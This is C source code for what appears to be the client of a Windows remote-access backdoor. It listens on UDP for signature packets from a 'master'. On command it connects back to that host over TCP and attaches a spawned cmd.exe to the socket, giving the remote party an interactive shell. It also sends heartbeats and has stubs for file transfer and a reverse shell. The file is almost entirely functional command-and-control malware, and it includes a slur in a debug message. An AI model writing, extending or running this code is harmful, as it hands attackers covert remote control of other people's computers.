#include "includes.h"

// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")



const char _SIG_INIT[] = {0xfb, 0x00};
const char _SIG_FILE[] = {0xfb, 0x01};
const char _SIG_COUT[] = {0xfb, 0x02};
const char _SIG_SHLL[] = {0xfb, 0x03};
const char _SIG_HRBT[] = {0xff, 0xff};

int HeartBeat(SOCKET s){
    /* Slave -> Master relationship*/
    int iResult;
    iResult = send(s, _SIG_HRBT, 2, 0);
    DBGLG("Sent heartbeat\n");
    return iResult;
}

SOCKET* __sock_TCP = NULL;
SOCKET* __sock_UDP = NULL;
PROCESS_INFORMATION* __child = NULL;

void HandleCTRL_C(int sg){
    if (__sock_TCP && (*__sock_TCP != INVALID_SOCKET))
        closesocket(*__sock_TCP);
    if (__sock_UDP && (*__sock_UDP != INVALID_SOCKET))
        closesocket(*__sock_UDP);
    if (__child)
        TerminateProcess(__child->hProcess, 0);
    exit(0);

}

int __cdecl main(int argc, char **argv)
{
    int iResult, sig;
    char buf[1024];
    SOCKET ListenSocket = INVALID_SOCKET;
    SOCKET sock = INVALID_SOCKET;
    SOCKET socku = INVALID_SOCKET;
    struct sockaddr_in ad_info;
    PROCESS_INFORMATION pi;
    HANDLE hStdinRd, hStdinWr, hStdoutRd, hStdoutWr;
    __sock_TCP = &sock;
    __sock_UDP = &socku;
    __child = &pi;
    signal (SIGINT, HandleCTRL_C);

    iResult = InitSetup();
    if (iResult < 0){
        return 1;
    }
    iResult = SetupServerUDP(&socku);
    if (iResult > 0){
        perror("udpsetup failed");
        return 1;
    }
    /* TODO: Start a thread for heartbeating [UDPIpSetup, Connect, HeartBeat, Close]*/
    while (1){
        // MAIN EVENT LOOP
        eventloop:
        memset(&buf, 0, 1024 * sizeof(char));
        DBGLG("Listening\n");
        struct sockaddr_in ccServer;
        int ccServerSize = sizeof(ccServer);
        iResult = recvfrom(socku, (char*)&buf, 1024, 0, (struct sockaddr *)&ccServer, &ccServerSize);
        if (iResult < 0){
            perror("Packet did something wonky");
            printf("%d", WSAGetLastError());
            exit(1);
            goto eventloop;
        }
        sig = MatchSig(buf);
        if (sig < 0){
            perror("Invalid signature dropping connection");
            goto eventloop;
        }
        switch (sig){
            case 0x0:
                DBGLG("Got 0\n");
            /* INITIALIZE and should not be handled on client side*/
                break;
            case 0x1:
                DBGLG("Got 1\n");
            /* File transfer, presumably uploading to client */
                break;
            case 0x2:
            /* Individual command output master -> (cmd) ->slave -> (output) -> master*/
                DBGLG("Got 2 starting shell\n");
                struct addrinfo* tcp_inf;
                iResult = IpSetupINIT(&tcp_inf, inet_ntoa(ccServer.sin_addr));
                iResult = Connect(&sock, tcp_inf);
                if (iResult < 0){
                    perror("failed at connecting");
                }
                SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

                // Create pipes for the child process's standard input and output.
                if (!CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0) ||
                    !CreatePipe(&hStdinRd, &hStdinWr, &sa, 0))
                {
                    perror("failed at creating pipes for child process");
                    break;
                }
                sa.bInheritHandle = TRUE;
                STARTUPINFO si = { sizeof(STARTUPINFO) };
                si.dwFlags = STARTF_USESTDHANDLES;
                si.hStdInput = hStdinRd;
                si.hStdOutput = hStdoutWr;
                si.hStdError = hStdoutWr;
                OVERLAPPED writeOverlapped = { 0 };
                OVERLAPPED readOverlapped = { 0 };
                writeOverlapped.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
                readOverlapped.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
                if (!CreateProcess(NULL, "C:\\Windows\\System32\\cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
                {
                    perror("failed at creating process");
                    closesocket(sock);
                    break;
                }
                CloseHandle(hStdoutWr);
                CloseHandle(hStdinRd);
                /* INITIAL CMD LOADING*/
                ScanOutPipe(hStdoutRd, &readOverlapped, sock);
                ScanOutPipe(hStdoutRd, &readOverlapped, sock);
                /*END OF LOADING*/
                while (1){
                    iResult = WriteInPipe(hStdinWr, &writeOverlapped ,sock);
                    if (iResult){
                        break;
                    }
                    iResult = ScanOutPipe(hStdoutRd, &readOverlapped, sock);
                    if(iResult){
                        break;
                    }
                }
                CloseHandle(hStdoutRd);
                CloseHandle(hStdinWr);
                TerminateProcess(pi.hProcess, 0);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                closesocket(sock);
                break;
            case 0x3:
                DBGLG("Got 3\n");
            /* Reverse shell */
                break;
            case 0xff:
                DBGLG("Got ff\n");
            /* Heartbeat */
                break;
            default:
                DBGLG("Got retarded data\n");
        }
    }

    WSACleanup();
    return 0;

}
